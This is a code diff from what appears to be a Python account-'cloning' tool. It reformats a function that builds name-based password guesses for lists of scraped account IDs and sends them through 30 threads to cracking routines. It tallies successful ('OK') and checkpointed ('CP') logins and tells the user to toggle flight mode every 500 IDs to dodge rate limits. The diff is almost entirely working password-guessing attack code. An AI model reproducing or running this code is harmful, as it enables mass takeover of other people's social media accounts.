@@ -631,96 +631,104 @@ def setting():
     exit() 
  
 #-------------------[ BAGIAN-WORDLIST ]------------#
- 
-def passwrd():
-	os.system('clear')
-	banner()
-	info()
-	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
-	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-	linex()
-	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
-	linex()
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			pwv = []
-			frs = nmf.split(' ')[0]
-			try:
-				lst = nmf.split(' ')[1]
-			except:
-				lst = ''
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'bapi' in method:
-				pool.submit(bapi,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			else:
-				pool.submit(crackmbasic,idf,pwv)
-	print('\n\x1b[37m----------------------------------------------')
-	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
-	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
-	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
-	linex()
-	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
-	restart()
 
+# Define the banner function
 def banner():
     # Your implementation of the banner function
     pass  # Placeholder for the actual implementation
+
+# Define the passwrd function
+def passwrd():
+    os.system('clear')
+    banner()
+    info()
+    print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
+    print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
+    linex()
+    print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
+    linex()
+    
+    with tred(max_workers=30) as pool:
+        for yuzong in id2:
+            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
+            pwv = []
+            frs = nmf.split(' ')[0]
+            try:
+                lst = nmf.split(' ')[1]
+            except:
+                lst = ''
+                
+            if len(nmf) < 6:
+                if len(frs) < 3:
+                    pass
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs + lst)
+                    pwv.append(frs + '@' + lst)
+                    pwv.append(frs + '#' + lst)
+                    pwv.append(lst + frs)
+                    pwv.append(frs + '12')
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '321')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '@123')
+                    pwv.append(frs + '@1234')
+                    pwv.append(frs + lst + '123')
+                    pwv.append(frs + lst + '1234')
+                    pwv.append(frs + lst + '@123')
+                    pwv.append(frs + lst + '@1234')
+                    pwv.append(frs + lst + '321')
+                    pwv.append(lst + frs + '123')
+                    pwv.append(lst + frs + '111')
+            else:
+                if len(frs) < 3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs + lst)
+                    pwv.append(frs + '@' + lst)
+                    pwv.append(frs + '#' + lst)
+                    pwv.append(lst + frs)
+                    pwv.append(frs + '12')
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '321')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '@123')
+                    pwv.append(frs + '@1234')
+                    pwv.append(frs + lst + '123')
+                    pwv.append(frs + lst + '1234')
+                    pwv.append(frs + lst + '@123')
+                    pwv.append(frs + lst + '@1234')
+                    pwv.append(frs + lst + '321')
+                    pwv.append(lst + frs + '123')
+                    pwv.append(lst + frs + '111')
+
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:
+                pass
+            
+            if 'mobile' in method:
+                pool.submit(crack, idf, pwv)
+            elif 'free' in method:
+                pool.submit(crackfree, idf, pwv)
+            elif 'bapi' in method:
+                pool.submit(bapi, idf, pwv)
+            elif 'free' in method:
+                pool.submit(crackfree, idf, pwv)
+            else:
+                pool.submit(crackmbasic, idf, pwv)
+                
+    print('\n\x1b[37m----------------------------------------------')
+    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
+    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
+    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
+    linex()
+    woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
+    restart()
 
 #--------------------[ METODE-B-API ]-----------------#
  
